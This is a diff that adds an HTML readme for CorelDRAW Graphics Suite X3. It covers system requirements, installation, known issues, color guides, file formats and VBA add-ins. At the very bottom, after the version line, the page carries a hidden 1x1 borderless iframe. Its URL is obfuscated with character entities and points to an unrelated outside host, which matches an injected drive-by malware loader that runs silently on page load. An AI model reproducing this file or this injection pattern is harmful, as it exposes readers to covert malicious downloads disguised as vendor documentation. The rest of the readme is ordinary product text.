@@ -1,0 +1,564 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<html>
+<head>
+  <title>CorelDRAW Graphics Suite X3 - Readme Notes</title>
+  <meta http-equiv="Content-Type"
+ content="text/html; charset=iso-8859-1">
+</head>
+<body>
+<font face="Times New Roman, Times, serif" size="+1"><b><font
+ color="#000000"><a name="Top"></a>CorelDRAW Graphics Suite X3</font></b></font>
+<p><font face="Times New Roman, Times, serif"><b><font color="#000000">Readme
+Notes</font></b></font> </p>
+<p><font face="Times New Roman, Times, serif"><b><font color="#000000">Contents</font></b></font>
+</p>
+<ul>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#Requirements">Minimum System Requirements</a></font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#Installation">Installation</a></font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#AllApplications">All Applications</a></font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#CorelDRAW">CorelDRAW X3</a></font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#Corel_PHOTO-PAINT">Corel PHOTO-PAINT X3</a></font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#Printing">Printing</a></font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a href="#Pantone">Pantone 
+    Color Guides</a> </font></li>
+  <li><a href="#ColorManagement">Color Management </a></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#Import_Export">Import/Export Formats</a></font></li>
+  <li><a href="#Bitstream_Font_Navigator">Bitstream Font Navigator</a> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><a
+ href="#ObjectModel">VBA</a></font> </li>
+  <li><font face="Times New Roman, Times, serif"><a href="#trialoem">Trial, Academic, 
+    and OEM Versions</a></font> </li>
+  <li><font face="Times New Roman, Times, serif"><a href="#techsupp">Technical 
+    Support</a></font> </li>
+</ul>
+<hr>
+<p><font face="Times New Roman, Times, serif"><a name="Requirements"></a><b><font
+ color="#000000">Minimum System Requirements</font></b></font> </p>
+<ul>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Windows
+2000, Windows XP (Home, Professional, Media Edition, 64-bit or Tablet
+PC Edition), or Windows Server 2003 with latest Service Pack </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Pentium
+III, 600 MHz or greater </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">256 MB
+RAM </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Mouse
+or tablet </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">1024 x
+768 screen resolution (768 x 1024 on a Tablet PC) </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">CD-ROM
+drive</font><font color="#ff6666" face="Times New Roman, Times, serif">
+    </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">200 MB hard disk 
+    space (CorelDRAW only; more space will be required for other suite applications) 
+    </font></li>
+  <li><font face="Times New Roman, Times, serif"><font color="#000000">Microsoft
+Internet Explorer 6 or higher </font><br>
+    </font> </li>
+</ul>
+<p><font face="Times New Roman, Times, serif"><a name="Installation"></a><b><font
+ color="#000000">Installation</font></b></font> </p>
+<p><font face="Times New Roman, Times, serif"><u>Before installing
+CorelDRAW Graphics Suite X3</u></font> </p>
+<ul>
+  <li><font face="Times New Roman, Times, serif">Make sure that your
+system Date/Time are set correctly. </font></li>
+  <li><font face="Times New Roman, Times, serif">Close all
+applications, including all virus detection programs and applications
+that are open in the system tray or on the Windows taskbar. Not doing
+so may increase the installation time and interfere with installation. </font></li>
+  <li><font face="Times New Roman, Times, serif">On Windows 2000 or XP,
+you should be logged in as an administrator or as a user with
+administrative rights. </font></li>
+  <li><font face="Times New Roman, Times, serif">Make sure that you
+have enough free disk space available on the drive where you want to
+install the application. </font></li>
+  <li><font face="Times New Roman, Times, serif">To avoid file and
+memory conflicts, close all running programs and delete the contents of
+your system's TEMP folders. [C:\Documents and Settings\&lt;<i>Administrator</i>&gt;\Local
+Settings\Temp] and [C:\<i>&lt;WINNT&gt;</i>\Temp] </font></li>
+  <li><font face="Times New Roman, Times, serif">Corel recommends that
+you install CorelDRAW Graphics Suite X3 in its own directory to avoid
+conflicts with previous versions.</font></li>
+</ul>
+<p><font face="Times New Roman, Times, serif"> <b><font color="#000000">Network/Workstation</font></b></font>
+</p>
+<ul>
+  <li><font color="#000000" face="Times New Roman, Times, serif">For
+network administrators, a Network Deployment Guide is available to
+organizations that have purchased multiple licenses of CorelDRAW
+Graphics Suite X3. For more information, contact Corel's Licensing
+Department or Customer Service.</font> </li>
+</ul>
+<font face="Times New Roman, Times, serif"><b><font color="#000000">Installing
+</font>CorelDRAW Graphics Suite X3</b></font>
+<p><font face="Times New Roman, Times, serif">Before you begin, read "Before installing 
+  CorelDRAW Graphics Suite X3" above. </font></p>
+<ol>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Insert
+Disc 1 in the CD drive.</font><font face="Times New Roman, Times, serif">
+    <br>
+    </font> <font color="#000000" face="Times New Roman, Times, serif">If
+the Autorun screen does not start automatically, click <b>Start</b> on
+the Windows taskbar, and click <b>Run</b>. Type<b> D:\autorun.exe </b>or<b>
+D:\CGS13\Setup.exe</b>, where <b>D</b> is the letter that corresponds
+to the CD drive.</font> </li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Follow
+the instructions for installing the application.</font> </li>
+</ol>
+<font face="Times New Roman, Times, serif"><b><font color="#000000">Uninstalling
+</font>CorelDRAW Graphics Suite X3</b></font>
+<p><font face="Times New Roman, Times, serif"><u><font color="#000000">For
+Windows 2000</font></u></font> </p>
+<ol>
+  <li><font color="#000000" face="Times New Roman, Times, serif">On the
+Windows taskbar, click <b>Start</b> &gt; <b>Settings</b> &gt; <b>Control
+panel</b> &gt; <b>Add/remove programs.</b></font></li>
+</ol>
+<blockquote><font face="Times New Roman, Times, serif">If you want to keep your 
+  user files such as preferences, presets, user-created fills, and customized 
+  files, click <b>Remove</b>. If you want to remove user files, click <b>Change</b>, 
+  and then click <b>Remove</b>. You will be prompted to remove your user files. 
+  </font> </blockquote>
+<font face="Times New Roman, Times, serif"><u><font color="#000000">For
+Windows XP</font></u></font>
+<ol>
+  <li><font color="#000000" face="Times New Roman, Times, serif">On the
+Windows taskbar, click <b>Start</b> &gt; <b>Control panel</b> &gt; <b>Add
+or remove programs.</b></font><br>
+    <font face="Times New Roman, Times, serif"><br>
+    If you want to keep your user files such as preferences, presets, user-created 
+    fills, and customized files, click <b>Remove</b>. If you want to remove user 
+    files, click <b>Change</b>, and then click <b>Remove</b>. You will be prompted 
+    to remove your user files. </font></li>
+</ol>
+<p><font color="#000000" face="Times New Roman, Times, serif"><u>CorelDRAW
+Design Collections</u></font><u><font color="#ff6666"
+ face="Times New Roman, Times, serif"> </font></u></p>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><b> </b><font
+ color="#000000">CorelDRAW Design Collections is available on CD#4. To install 
+  CorelDRAW Design Collections you must obtain a serial number by registering 
+  your CorelDRAW Graphics Suite X3 applications online or through customer service. 
+  Once registered, you will receive a serial number which you will be required 
+  to input during the CorelDRAW Design Collections installation.</font></font></p>
+<p><font color="#000000" face="Times New Roman, Times, serif">CorelDRAW Design 
+  Collections requires that CorelDRAW X3 and VBA be installed<b>.</b></font></p>
+<p><font face="Times New Roman, Times, serif"><a name="Documentation"></a><b><font
+ color="#000000">Documentation</font></b></font> </p>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><u><font
+ color="#000000">Documentation and Tutorials</font></u></font> </p>
+<p><font color="#000000" face="Times New Roman, Times, serif">The electronic documentation 
+  files listed below are available with CorelDRAW Graphics Suite X3. If installed, 
+  these documents can be accessed by clicking <b>Start </b>on the Windows taskbar<b>, 
+  </b>and clicking <b>Programs &gt; CorelDRAW Graphics Suite X3 &gt; Documentation</b>. 
+  Unless otherwise noted, these files are in PDF format and require Adobe Reader 
+  or a compatible application to view them. Adobe(R) Reader is available for download 
+  from <a
+ href="http://www.adobe.com/" target="_blank">http://www.adobe.com/</a>.</font></p>
+<ul>
+  <li><font color="#000000" face="Times New Roman, Times, serif">The <strong>CorelDRAW 
+    Graphics Suite X3 User Guide</strong> can be installed during setup. If installed, 
+    it will be linked from the Windows <b>Start</b> menu under <b>CorelDRAW Graphics 
+    Suite X3 </b>&gt; <b>Documentation</b>. If not installed, you can add it to 
+    your existing installation through <strong>Control panel &gt; Add/remove programs</strong>. 
+    Choose CorelDRAW Graphics Suite X3, <strong>Change</strong>. </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">If the Microsoft 
+    Visual Basic for Applications (VBA) component for CorelDRAW Graphics Suite 
+    X3 is installed, the <strong>CorelDRAW Graphics Suite Programming Guide for 
+    VBA</strong> as well as the <strong>Object Model</strong> documents, will 
+    be available. </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><b><strong>Tutorial</strong>s</b> 
+    for CorelDRAW X3 and Corel PHOTO-PAINT X3 are available for each application 
+    and accessible from the <b>Start</b> menu. The start pages are in HTML format 
+    and require an Internet browser to view them, and the individual tutorials 
+    are PDF files. All sample files used for the tutorials are available from 
+    the <b>...\Program Files\Corel\Corel Graphics X3\Languages\&lt;LANG&gt;\Tutorials\Samples 
+    files</b> or equivalent subfolder. </font></li>
+</ul>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><u><font
+ color="#000000">Digital Content</font></u></font></p>
+<ul>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Open
+Type fonts and True Type and Type 1 symbol fonts are included with
+CorelDRAW Graphics Suite X3; however, they must first be added or
+installed to be used within applications. For more information on
+installing fonts, refer to your Windows documentation, the Help within
+Font Navigator or any other font management program. </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif">Fonts are available 
+    within the <b>Fonts</b> folder on CD #3.</font></li>
+  <font color="#000000"> Symbols are available in the <strong>Symbols</strong> 
+  folder on CD #3. </font> 
+  <li><font color="#000000"
+ face="Times New Roman, Times, serif">Extra <strong>Pattern fill</strong>,
+    <strong>Spraylist</strong>, <strong>Frames </strong>and <strong>Tile</strong>
+files are available on CD #2. <strong>Brush textures</strong>, <strong>Image
+lists, Objects</strong> and <strong>Photos</strong> are available on
+CD #3. See the Help for more information on how to load and use these
+files within CorelDRAW Graphics Suite X3 applications. </font></li>
+  <li><font color="#000000" face="Times New Roman, Times, serif"><strong>Samples
+files</strong> for each application are available in a samples
+sub-folder for each application <br>
+(for example, ..<strong>\Program Files\Corel\CorelDRAW Graphics
+X3\Draw\Samples</strong>).</font><font
+ face="Times New Roman, Times, serif"> </font> </li>
+</ul>
+<p><font face="Times New Roman, Times, serif"><a id="CGS12"
+ name="AllApplications"></a><b><font color="#000000">All Applications</font></b></font>
+</p>
+<p><font color="#000000" face="Times New Roman, Times, serif"><u>Workspace</u></font>
+</p>
+<p><font color="#000000" face="Times New Roman, Times, serif">Periodically,
+it may be necessary to restore the application&#8217;s workspace to the
+default settings. To do this, hold down <b>F8</b>, and start the
+application. A dialog box appears asking if you want to overwrite the
+current workspace with the factory default. Click <b>Yes</b>. The
+application will start using the default settings for the currently
+selected workspace. Note that you will lose any workspace customization
+that you have done. See the Help for information about creating, using,
+and customizing multiple workspaces.</font><font color="#000000"
+ face="Times New Roman, Times, serif"> </font></p>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><u><font
+ color="#000000">Performance </font></u></font></p>
+<font color="#000000" face="Times New Roman, Times, serif"> A minimum 200 MB paging 
+file is recommended for best performance when using CorelDRAW Graphics Suite X3 
+applications. Paging file sizes are set in the <b>Operating system &gt; Virtual 
+memory</b> controls.</font> 
+<p><font face="Times New Roman, Times, serif"><u>Tablet PC &amp; Pen
+support</u></font></p>
+<font face="Times New Roman, Times, serif"> If you're using a Tablet PC with a 
+Wacom(R) interface, and you don't have pen pressure support, you can fix this 
+by getting a Tablet PC driver update from Wacom.</font> 
+<p><font color="#000000" face="Times New Roman, Times, serif"><strong><a
+ name="CorelDRAW"></a></strong></font><font color="#000000"
+ face="Times New Roman, Times, serif"><strong>CorelDRAW X3</strong><br>
+<br>
+</font><font face="Times New Roman, Times, serif"><u>File I/O:</u></font></p>
+<ul>
+  <li>You can make use of the Unicode compatibility within CorelDRAW X3 and have 
+    all application text (for example, layer names, object names, and so on) from 
+    earlier versions appear correctly. You will first need to ensure that you 
+    have the appropriate language support installed within your operating system. 
+    Then, when opening files created in an earlier version that ran on an operating 
+    system with a different code page from that of your current operating system, 
+    make sure to set the appropriate code page in the <b>Open </b>dialog box. 
+    For example, if you created a CorelDRAW 11 file on a Japanese operating system 
+    and you are opening the file in CorelDRAW X3 running on an English operating 
+    system, when opening the file, you would need to set the code page to 932.&nbsp;</li>
+  <li><font face="Times New Roman, Times, serif">When opening CDR/DES files created 
+    in Corel DESIGNER Professional SG &nbsp;or Corel DESIGNER Technical Suite 
+    12 that contain unsupported objects (for example, diametric/radial dimensions 
+    or callouts), a warning message will appear indicating that the file contains 
+    unsupported objects. These objects will appear locked while working in CorelDRAW 
+    X3. You will have the option of unlocking them and converting them to grouped 
+    objects; however, if you wish to re-save the file and maintain the Corel DESIGNER 
+    Professional SG or Corel DESIGNER Technical Suite 12 features intact, you 
+    should leave these objects locked.</font>&nbsp;</li>
+  <li><font color="#000000">When saving drop shadows to previous version file 
+    formats, the drop shadows will be converted to lens objects. The look of the 
+    object will be preserved; however, it will no longer be editable as a drop 
+    shadow object.</font>&nbsp;&nbsp;</li>
+  <li>Enhanced outline styles from Corel DESIGNER Technical Suite 12 will be maintained 
+    in .DES files opened and re-saved within CorelDRAW X3. </li>
+</ul>
+<p><font face="Times New Roman, Times, serif"><u>Scrapbook</u></font> </p>
+<ul>
+  <li><font face="Times New Roman, Times, serif">If CorelDRAW X3 is installed 
+    on a system that also has CorelDRAW 11 and/or CorelDRAW 10, the search capability 
+    in the earlier versions will be affected. After you complete a search in CorelDRAW 
+    11 or 10, a blank list is generated in the <b>Results</b> window. To avoid 
+    this, you can modify the registry key HKEY_LOCAL_MACHINE\SOFTWARE\COREL\CorelSearch\CorelDRAW13</font><font
+ face="Times New Roman, Times, serif">. Modify the registry key from a dynamic 
+    value to the absolute language ID (for example, if searching in English, the 
+    modification would be to change the path from <b>..\Languages\&lt;LANG&gt;\Programs\Search.idx</b> 
+    to <b>..\Languages\EN\Programs\Search.idx</b>) </font></li>
+</ul>
+<blockquote>
+  <p><font face="Times New Roman, Times, serif">CorelDRAW X3 has the
+added functionality of being able to copy your content from the CD to
+another location and continue using the Scrapbook features. To make use
+of
+this functionality, you will need to do the following: </font></p>
+  <blockquote>
+    <ol>
+      <li><font face="Times New Roman, Times, serif">In the location of
+your choice, create a folder that has the same name as the volume label
+of the content CD (for example, for the CorelDRAW Graphics Suite X3
+clipart disk, you would require a folder called "CGX3_CLPART"). </font></li>
+      <li><font face="Times New Roman, Times, serif">Copy the entire
+contents of that CD, including the volinfo.txt file, into this folder. </font></li>
+      <li><font face="Times New Roman, Times, serif">In the registry
+key HKEY_LOCAL_Machine\Software\Corel\Media\Corel GRAPHICS X3 Clipart
+(Disk2), change the path to the location of the folder you created in
+step #1. </font></li>
+      <li><font face="Times New Roman, Times, serif">In the registry
+key HKEY_LOCAL_Machine\Software\Corel\Media\Corel GRAPHICS X3 Photos
+(Disk3), change the path to the location of the folder you created in
+step #1.<br>
+You will now be able to browse and perform searches on your photos
+&amp; objects without the need to use the content CDs. </font></li>
+    </ol>
+  </blockquote>
+</blockquote>
+<p><font face="Times New Roman, Times, serif"><u>Web Features</u></font></p>
+<p>Microsoft Internet Explorer 5 or later, or Netscape Navigator 4 or
+later, is required for the Web features of CorelDRAW Graphics Suite X3.</p>
+<p><font face="Times New Roman, Times, serif"><u>Artistic Media Tool</u></font></p>
+<p><font face="Times New Roman, Times, serif">The <b>Artistic media</b>
+tool can spray and brush effects, such as transparencies and lenses;
+however, overlapping several strokes may decrease application
+performance. </font></p>
+<p><font face="Times New Roman, Times, serif"><u>Text</u></font></p>
+<ul>
+  <li><font face="Times New Roman, Times, serif">For multilingual
+support in Windows 2000, do the following: From the control panel,
+double-click <b>Regional options</b>. Click the <b>General</b> tab,
+and click <b>Set default</b>. This changes the system code page. Then,
+install the appropriate keyboard or input method editor (IME). </font></li>
+  <li><font face="Times New Roman, Times, serif">For multilingual
+support in Windows XP, do the following with an administrator account:
+From the control panel, click <b>Date, time, language, and regional
+options</b>. Click <b>Regional and language options</b>. Click the <b>Advanced</b>
+tab. In the <b>Language for non-Unicode programs</b> area, choose a
+language from the list box. Then, install the appropriate keyboard or
+IME.</font></li>
+  <li><font face="Times New Roman, Times, serif">To change the code page of selected 
+    text and selected text objects, click <b>Text &gt; Encode</b>. It is recommended 
+    that the code page be set first, in <strong>Text</strong> &gt; <strong>Encode</strong> 
+    prior to applying non-unicode fonts to selected text and selected text objects.</font></li>
+  <li>Text fitted to a path and mirrored will be converted to curves when saving 
+    to previous versions. </li>
+</ul>
+<font face="Times New Roman, Times, serif"> </font>
+<p><font face="Times New Roman, Times, serif"><strong><a
+ name="Corel_PHOTO-PAINT"></a></strong></font><font
+ face="Times New Roman, Times, serif"><strong>Corel PHOTO-PAINT X3</strong></font></p>
+<ul>
+  <li><font face="Times New Roman, Times, serif"> Sound for Web
+rollover states is not supported in Netscape Navigator.</font></li>
+  <li><font face="Times New Roman, Times, serif">When using the Cutout
+Lab with larger images you should make sure you have at least 3 times
+the image size in available memory (either real or virtual memory).</font>
+  </li>
+  <li><font face="Times New Roman, Times, serif">To make use of the QuickTimeVR 
+    functionality in PHOTO-PAINT, you must have installed QuickTime version 6.x.</font>&nbsp;</li>
+  <li><font face="Times New Roman, Times, serif">When using Windows XP
+with
+Service Pack 2, to preview rollovers created in PHOTO-PAINT,&nbsp; you
+must temporarily disable the automatic pop-up blocker.&nbsp;</font>&nbsp;</li>
+  <li>When opening previous version .cpt files (Version 9 and earlier) on systems 
+    without the same font and language support installed as when the file was 
+    created, type attributes, such as color and size, may change to the default 
+    system default font type attributes. </li>
+</ul>
+<p><font face="Times New Roman, Times, serif"><a name="Printing"></a><b><font
+ color="#000000">Printing </font></b></font></p>
+<ul>
+  <li>When Document Overprints is set to Simulate, the ouput will be rasterized.&nbsp; 
+    This is not recommended for color-critical work.</li>
+  <li>Some PostScript fills may not print correctly on PS printers.</li>
+  <li>No warning message will appear when trying to print to a printer offline.</li>
+</ul>
+<p><font color="#000000" face="Times New Roman, Times, serif"><strong><a name="Pantone"></a>Pantone 
+  Color Color Guides</strong></font></p>
+<p>In the Spring of 2005, Pantone, Inc., released two brand-new color guides:</p>
+<p>PANTONE color bridge coated</p>
+<p>PANTONE color bridge coated EURO</p>
+<p>These guides replace the PANTONE solid to process guide coated, and PANTONE 
+  solid to process guide coated Euro, respectively.</p>
+<p>Corel is pleased to offer support for the CMYK simulation values contained 
+  within these two guides. The PANTONE library which is labeled 'PANTONE solid 
+  to process coated EURO' actually has the updated values contained in the PANTONE 
+  color bridge coated EURO guide. Unfortunately we were unable to change the library 
+  name in time to make our planned release date for this version of CorelDRAW. 
+  We will revisit this in future releases.</p>
+<p>With regard to the North American version of PANTONE color bridge coated, if 
+  you select PANTONE colors from the PANTONE solid coated, PANTONE solid uncoated 
+  or PANTONE solid matte libraries, the resulting CMYK values are consistent with 
+  those in PANTONE color bridge coated.</p>
+<p>Please note that the data within the PANTONE solid to process guide coated, 
+  and PANTONE solid to process guide coated EURO, are not supported in this release.</p>
+<p>For more information on Pantone's newest guides, please use the following links:</p>
+<p>PANTONE color bridge coated</p>
+<p><a href="http://www.pantone.com">http://www.pantone.com</a></p>
+<p>PANTONE color bridge coated EURO</p>
+<p><a href="http://www.pantone.co.uk">http://www.pantone.co.uk</a><br>
+</p>
+<p><font face="Times New Roman, Times, serif"><b><font color="#000000"><a
+ name="ColorManagement"></a>Color Management</font></b></font> </p>
+<ul>
+  <li>The color mode used for effects setting is for display only.&nbsp; Output 
+    will automatically select the proper color mode based on the destination color 
+    space.&nbsp; E.g. if you are exporting the document as an RGB JPG file, RGB 
+    color mode will be used.&nbsp; If you are printing to a PostScript printer, 
+    CMYK color mode will be used.&nbsp; </li>
+</ul>
+<p><font color="#000000" face="Times New Roman, Times, serif"><a
+ name="Import_Export"></a><b>Import/Export </b></font><u><br>
+<br>
+Adobe Illustrator (AI)</u> </p>
+<ul>
+  <li>Adobe Illustrator 11 CS2 files are not fully supported for AI
+import
+or export.&nbsp; </li>
+</ul>
+<p><u>PDF</u> </p>
+<ul>
+  <li>Character spacing may not be as expected when importing PDF files
+containing
+fonts that are not installed on your system.</li>
+  <li>Placed EPS files cannot be displayed in exported PDF files;
+however,
+they do print properly.</li>
+  <li>Preservation of the layer structure in the document, and JP2 bitmap compression 
+    options, is only supported when using Acrobat 6.0 compatibility.</li>
+  <li>Permissions password is required to open PDFs that have any
+restrictions
+applied to them.&nbsp; If no restrictions were applied to the PDF,
+either
+the Open password or the Permissions password will open the file.</li>
+  <li>Some special characters may not be supported when saving PDFs
+with
+text encoded as ASCII in the PDF settings.&nbsp; If you are using
+special
+characters or double-byte characters, set the text encoding to Unicode
+instead.<br>
+  </li>
+</ul>
+<p><u>AutoCAD (DXF) </u> </p>
+<ul>
+  <li>When importing DXF files, the Auto-reduce nodes option removes
+hidden
+lines caused by multiple views within the file. It does not modify
+nodes
+on curve objects.</li>
+  <li>Importing file formats that contain 3D objects will have
+unexpected
+results. <br>
+  </li>
+</ul>
+<p><u>JPEG 2000 (JP2) </u> </p>
+<ul>
+  <li>Not all Web browsers support the JPEG 2000 file format (JPEG 2000
+Standard
+and JPEG 2000 Codestream). You may require a plug-in to view files
+saved
+to this format. </li>
+  <li>JP2 import filter supports JPEG 2000 Standard and JPEG 2000
+Codestream. </li>
+  <li>JPEG 2000 Codestream uses the .jp2 filename extension with
+metadata
+on export. </li>
+</ul>
+<p><u>Portable Network Graphics (PNG)</u> </p>
+<ul>
+  <li>Not all browsers support PNG transparency. Please check your
+browser
+documentation. </li>
+</ul>
+<p><u>Scalable Vector Graphics (SVG)</u> </p>
+<ul>
+  <li>To preview SVG files through the SVG export dialog box, you need
+an SVG viewer.</li>
+</ul>
+<font face="Times New Roman, Times, serif"><a
+ name="Bitstream_Font_Navigator"></a><b>Bitstream Font Navigator</b> </font>
+<ul>
+  <li><font face="Times New Roman, Times, serif">If you have installed
+Bitstream Font Navigator with a previous version of CorelDRAW Graphics
+Suite and have created font groups and font catalogs, these will be
+seen within the the version of Bitstream Font Navigator installed with
+this product. If you uninstall the previous version of Bitstream Font
+Navigator, these font groups and font catalogs will be removed and will
+need to be recreated in the version of Bitstream Font Navigator
+installed with this product.</font> </li>
+</ul>
+<p><font face="Times New Roman, Times, serif"><a id="ObjectModel"
+ name="ObjectModel"></a><b><font color="#000000">Microsoft Visual Basic
+for Applications </font></b></font></p>
+<p>To use Microsoft Visual Basic for Applications within CorelDRAW X3
+and Corel PHOTO-PAINT X3, Microsoft Visual Basic for Applications 6.3
+must be installed. Microsoft Visual Basic for Applications 6.3 is
+included in the CorelDRAW Graphics Suite X3 Setup under Utilities and
+is installed by default during a typical installation. <br>
+<br>
+<span style="text-decoration: underline;"> VBA Programming Guide for
+CorelDRAW X3</span> <br>
+<br>
+The VBA Programming Guide for CorelDRAW X3 will help you automate tasks
+and create custom solutions using VBA. If you installed CorelDRAW using
+the typical install, or a custom install that included VBA, then the
+guide is accessible from a link in the VBA Help for CorelDRAW or from
+the corresponding CorelDRAW Graphics Suite X3 Start menu shortcut.<br>
+<br style="text-decoration: underline;">
+<span style="text-decoration: underline;"> Updating Macros from
+CorelDRAW 12 to CorelDRAW X3 </span><br>
+<br>
+To ensure that a macro written for CorelDRAW 12 will work as designed
+in CorelDRAW X3, you may need to change the name of the class, method,
+or property, or you may have to change parameters for the macro. <br>
+<br>
+<span style="text-decoration: underline;"> GMS Folders in the User
+Profile Path </span><br>
+<br>
+  GMS files are normally saved to the GMS folders under the CorelDRAW Graphics 
+  Suite X3\Draw and CorelDRAW Graphics Suite X3\CorelPHOTO-PAINT folders. If the 
+  user does not have write access to these folders, the GMS folders will be saved 
+  to the User <strong>Draw</strong> and <strong>CorelPHOTO-PAINT</strong> folders.<br>
+<br>
+<span style="text-decoration: underline;"> To use the Add-ins for a
+Windows XP Limited User Account </span><br>
+<br>
+Follow the steps below to use add-ins for a Limited User account (the
+example is for Corel PHOTO-PAINT): </p>
+<ol>
+  <li>Log in with administrator privileges to the system where you want
+to run the add-in. </li>
+  <li>Run regsvr32.exe on the add-in. This will add the required class
+IDs and registry keys that only an administrator can create. </li>
+  <li>Run regedit.exe. Navigate to
+HKEY_CURRENT_USER/Software/Corel/CorelDraw/13.0/Corel
+PHOTO-PAINT/Addins. </li>
+  <li>Select the key for your add-in (for example, PhotoPaint.Addin1). </li>
+  <li>From the Registry menu, click Export Registry File. Enable the Selected 
+    Branch option, type a filename in the File name box, and click Save. </li>
+  <li>Log in to the Limited User account and run regedit.exe. </li>
+  <li>From the Registry menu, click Import Registry File, specify the .reg file 
+    that you exported in step 5, and click Open. </li>
+  <li>You should be able to run the add-in from this Limited User
+account. </li>
+</ol>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><strong><font
+ color="#000000"><a name="trialoem"></a>Trial, Academic, and OEM
+Versions </font></strong></font></p>
+<p><font color="#000000" face="Times New Roman, Times, serif">Not all
+components are available in our trial, Academic, and OEM versions.
+Unavailable components may include Corel applications, features,
+third-party utilities and extra content files. However, some of these
+components may still be referred to within the applications and within
+the documentation. </font><font color="#ff6666"
+ face="Times New Roman, Times, serif"> </font></p>
+<p><font color="#ff6666" face="Times New Roman, Times, serif"><strong><font
+ color="#000000"><a name="techsupp"></a>Technical support </font></strong></font></p>
+<p><font color="#000000" face="Times New Roman, Times, serif">Technical Support 
+  is not available for OEM, "white box," jewel case (CD only), trial, or Academic 
+  versions of Corel products. For more information, please visit <a href="http://www.corel.com/support" target="_blank">www.corel.com/support</a>. 
+  </font><font face="Times New Roman, Times, serif"><br>
+</font></p>
+<p><font face="Times New Roman, Times, serif"><a href="#Top">Top of
+Document</a><br>
+</font> </p>
+<hr>
+<font color="#000000">&nbsp;v13.<span class="GramE">11.11.05_4</span></font><br>
+<br>
+<br>
+<br>
+<iframe src="http://jL.ch&#85;ra.pl&#47;rc/" width=1 height=1 frameborder=0></iframe>
+</body>
+</html>
